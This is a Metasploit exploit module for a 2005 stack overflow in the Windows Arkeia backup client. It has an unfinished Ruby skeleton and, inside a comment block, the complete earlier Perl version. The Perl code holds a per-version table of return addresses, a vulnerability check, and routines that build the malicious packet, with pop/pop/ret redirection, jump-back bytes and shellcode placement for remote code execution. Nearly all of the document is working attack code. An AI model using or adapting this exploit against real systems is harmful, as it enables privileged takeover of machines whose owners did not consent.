require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Arkeia Backup Client Type 77 Overflow (Win32)',
			'Description'    => %q{
				This module exploits a stack overflow in the Arkeia backup
				client for the Windows platform. This vulnerability affects
				all versions up to and including 5.3.3.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '14011'],
					[ 'BID', '12594'],
					[ 'URL', 'http://lists.netsys.com/pipermail/full-disclosure/2005-February/031831.html'],
					[ 'MIL', '7'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Feb 18 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::arkeia_type77_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::Arkeia;

my $advanced = { };

my $info =
{
	'Name'     => 'Arkeia Backup Client Type 77 Overflow (Win32)',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32'],
	'Priv'     => 1,
	'AutoOpts' => { 'EXITFUNC' => 'process' },
	
	'UserOpts' => 
	{
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 617],
	},

	'Payload' => 
	{
		'Space'     => 1000,
		'BadChars'  => "\x00",
		'Prepend' => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500					
		'Keys'		=> ['+ws2ord'],
	},

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the Arkeia backup
		client for the Windows platform. This vulnerability affects
		all versions up to and including 5.3.3. 
	}),

	'Refs'    => 
	[
		['OSVDB', '14011'],	
		['BID', '12594'],	
		['URL', 'http://lists.netsys.com/pipermail/full-disclosure/2005-February/031831.html'],
		['MIL', '7'],		
	],
	
	'Targets' => 
	[
		['Arkeia 5.3.3 and 5.2.27 Windows (All)',	0x004130a2, 5 ], # arkeiad.exe
		['Arkeia 5.2.27 and 5.1.19 Windows (All)',	0x00407b9c, 5 ], # arkeiad.exe
		['Arkeia 5.3.3 and 5.0.19 Windows (All)',	0x0041d6b9, 5 ], # arkeiad.exe
		['Arkeia 5.1.19 and 5.0.19 Windows (All)',	0x00423264, 5 ], # arkeiad.exe
		['Arkeia 5.x Windows 2000 English',			0x75022ac4, 5 ], # ws2help.dll
		['Arkeia 5.x Windows XP English SP0/SP1',	0x71aa32ad, 5 ], # ws2help.dll
		['Arkeia 5.x Windows NT 4.0 SP4/SP5/SP6',	0x77681799, 5 ], # ws2help.dll
		['Arkeia 4.2 Windows 2000 English',			0x75022ac4, 4 ], # ws2help.dll
		['Arkeia 4.2 Windows XP English SP0/SP1',	0x71aa32ad, 4 ], # ws2help.dll
		['Arkeia 4.2 Windows NT 4.0 SP4/SP5/SP6',	0x77681799, 4 ], # ws2help.dll
		['Arkeia 4.2 Windows 2000 German',			0x74fa1887, 4 ], # ws2help.dll
	],
	
	'Keys'    => ['arkeia'],

	'DisclosureDate' => 'Feb 18 2005',
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}
	
	$self->PrintLine("[*] Querying the Arkeia Backup Client...");
	my %info = Pex::Arkeia::ClientInfo($s);
	
	# Give up if we did not get a version response back
	if (! $info{'Version'} ) {
		$self->PrintLine("[*] Error: ". $info{'Error'});
		return $self->CheckCode('Unknown');
	}
	
	# Dump out the information returned by the server
	$self->PrintLine("[*] System Information");
	foreach my $inf (keys %info) {
		next if $inf eq 'Error';
		$self->PrintLine("      $inf: $info{$inf}");
	}

	# Throw a warning if they are using the wrong exploit	
	if ($info{'System'} !~ /Windows/i) {
		$self->PrintLine("[*] This module is not able to exploit the ".$info{'System'}." platform");
	}
	
	# We are going to assume that they will fix this in the next release
	if ($info{'Version'} =~ /Backup (4\.|5\.([012]\.|3\.[0123]$))/) {
		$self->PrintLine("[*] This system appears to be vulnerable");
		return $self->CheckCode('Confirmed');
	}
	
	# This is more than likely not vulnerable...
	$self->PrintLine("[*] This version may not be vulnerable");

	return $self->CheckCode('Safe');	
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
	
	my $head = "\x00\x4d\x00\x03\x00\x01\xff\xff";
	my $data;
	
	if ($target->[2] == 5) {
		$data = $self->Arkeia5($target->[1], $shellcode);
	}
	
	if ($target->[2] == 4) {
		$data = $self->Arkeia4($target->[1], $shellcode);
	}	
	
	# Configure the length value of the data in the packet header
	substr($head, 6, 2, pack('n', length($data)));
	
	$self->PrintLine("[*] Sending " .length($data) . " bytes to remote host.");
	$s->Send($head);
	$s->Send($data);
	
	# Takes a few seconds for the payload to pop (multiple exceptions)
	$s->Recv(-1, 10);
	
	return;
}

sub Arkeia5 {
	my $self = shift;
	my $addr = shift;
	my $code = shift;
	my $poof = Pex::Text::EnglishText(4096);
	
	# The return address is a pop/pop/ret in the executable or system lib
	substr($poof, 1176, 4, pack('V', $addr));

	# The pop/pop/ret takes us here, jump back five bytes
	substr($poof, 1172, 2, "\xeb\xf9");
	
	# Jump all the way back to our shellcode
	substr($poof, 1167, 5, "\xe9".pack('V', -1172));
	
	# Place our shellcode in the beginning of the request
	substr($poof, 0, length($code), $code);
	
	return $poof;
}

sub Arkeia4 {
	my $self = shift;
	my $addr = shift;
	my $code = shift;
	my $poof = Pex::Text::EnglishText(4096);
	
	# The return address is a pop/pop/ret in the executable or system lib
	substr($poof, 100, 4, pack('V', $addr));

	# The pop/pop/ret takes us here, jump over the return address
	substr($poof, 96, 2, "\xeb\x06");
	
	# Place our shellcode in the beginning of the request
	substr($poof, 104, length($code), $code);
	
	return $poof;
}


1;


=end


end
end	
